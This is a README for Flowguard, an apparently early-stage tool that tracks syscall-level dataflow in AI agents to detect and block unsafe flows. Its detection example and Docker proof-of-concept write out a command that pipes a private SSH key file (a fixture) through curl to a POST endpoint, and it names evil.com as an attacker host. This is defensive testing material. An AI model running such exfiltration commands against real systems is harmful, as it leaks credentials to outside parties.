# Syscall Provenance Engine for AI Agent Security

## Overview

This project implements a **runtime provenance tracking system** that observes execution events and reconstructs **dataflow at the syscall boundary**.

The goal is to detect and explain unsafe behavior in AI agents and automated systems.

---

## Motivation

Modern AI agents can:
- execute shell commands
- access files
- call APIs
- interact with external systems

This introduces risks such as:
- prompt injection leading to code execution
- data exfiltration
- execution of untrusted content

We need a system that answers:

> "Where did this data come from, and where did it go?"

---

## Key Idea

We model execution as a **provenance graph**
sources → processes → sinks

Where:
- sources = files, network, prompt input
- processes = programs
- sinks = execution, file writes, network

---

## Features (MVP)

- syscall-level event ingestion (simulated initially)
- provenance graph construction
- label propagation (PROMPT, EXTERNAL, SECRET, etc.)
- policy-based detection
- human-readable explanations

---

## Example Detection

### Secret Exfiltration

file:/home/user/.ssh/id_rsa –READ–> proc:cat
proc:cat –WRITE–> pipe
pipe –READ–> proc:curl
proc:curl –SEND–> ep:evil.com

Violation:

SECRET → NETWORK

## Reproduce The Docker Observe POC

This POC runs a real shell pipeline inside Docker:

```sh
cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak
```

Flowguard observes the syscalls with `strace`, builds the provenance graph, blocks the `SecretToNetwork` policy violation, and dumps the violation log plus graph files.

### Automated Regression

Run the full POC regression with one command:

```sh
bash scripts/run_observe_poc.sh
```

The script:
- builds the Docker observer image
- starts a local POST sink on a free host port
- runs the observed `cat secret | curl` leak inside Docker
- asserts Flowguard exits with `Block`
- asserts the report contains `SecretToNetwork`, a `Send` sink, and the explanation path
- dumps `logs/secret-to-network-regression.violation.log`
- dumps `logs/secret-to-network-regression.graph.dot`
- dumps `logs/secret-to-network-regression.graph.mmd`
- dumps `logs/secret-to-network-regression.raw.strace`
- dumps `logs/secret-to-network-regression.report.json`

Useful environment overrides:

```sh
FLOWGUARD_SKIP_DOCKER_BUILD=1 bash scripts/run_observe_poc.sh
FLOWGUARD_POC_NAME=my-run bash scripts/run_observe_poc.sh
FLOWGUARD_POC_PORT=18000 bash scripts/run_observe_poc.sh
FLOWGUARD_DOCKER_EXTRA_ARGS='--add-host=host.docker.internal:host-gateway' bash scripts/run_observe_poc.sh
```

### Validation Commands

Use the fast Rust suite for normal development:

```sh
cargo test
```

Use the Docker-backed POC regression before demo changes or observer changes:

```sh
bash scripts/run_observe_poc.sh
```

The Docker regression is intentionally not part of `cargo test` because it requires Docker, host networking to a local POST sink, and `strace` inside the observer image.

### Manual Steps

#### 1. Build The Observer Image

```sh
docker build -f docker/observer.Dockerfile -t flowguard-observer .
```

#### 2. Start A Local POST Sink

Run this in terminal 1:

```sh
python3 -u -c '
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("content-length", "0") or 0)
        if length:
            self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass

HTTPServer(("0.0.0.0", 18000), Handler).serve_forever()
'
```

#### 3. Run The Observed Leak

Run this in terminal 2:

```sh
mkdir -p logs

docker run --rm \
  -v "$PWD:/work" \
  -v "$PWD/fixtures/home:/home/user:ro" \
  -w /work \
  flowguard-observer \
  cargo run -- observe --json \
    --raw-strace logs/secret-to-network.raw.strace \
    -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak' \
  > logs/secret-to-network.report.json
```

Expected result: the command exits with status `1` because Flowguard blocks the policy violation. The JSON report is still written to `logs/secret-to-network.report.json`.

On Linux, if `host.docker.internal` is not available, add this to the `docker run` command:

```sh
--add-host=host.docker.internal:host-gateway
```

#### 4. Dump The Violation Log And Graph

```sh
python3 scripts/dump_observe_report.py \
  logs/secret-to-network.report.json \
  --out-dir logs \
  --name secret-to-network
```

Generated files:

- `logs/secret-to-network.violation.log`: human-readable policy violation and explanation path
- `logs/secret-to-network.graph.dot`: Graphviz graph for the explanation path
- `logs/secret-to-network.graph.mmd`: Mermaid graph for markdown/docs
- `logs/secret-to-network.raw.strace`: raw syscall trace from `strace`
- `logs/secret-to-network.report.json`: full Flowguard observability report

The explanation path should look like:

```text
file:/home/user/.ssh/id_rsa --READ--> proc:22@10030
proc:22@10030 --WRITE--> pipe:1000
pipe:1000 --READ--> proc:23@10040
proc:23@10040 --SEND--> endpoint:192.168.65.254:18000
```

Optional SVG render if Graphviz is installed:

```sh
dot -Tsvg logs/secret-to-network.graph.dot -o logs/secret-to-network.graph.svg
```

## Architecture

events → state → graph → labels → policies → explanations

Components:
- event ingestion
- process + FD tracking
- provenance graph
- label engine
- policy engine
- explanation engine

---

## Project Status

Early prototype.

Current focus:
- correctness
- clarity
- explainability

---


## Roadmap

- [ ] Synthetic event engine
- [ ] Provenance graph
- [ ] Label propagation
- [ ] Policy engine
- [ ] Scenario tests
- [ ] eBPF integration

---

## Why This Matters

This project explores:

> Runtime dataflow tracking for AI agents using syscall-level provenance.

It combines ideas from:
- system provenance
- runtime security
- AI agent safety

---
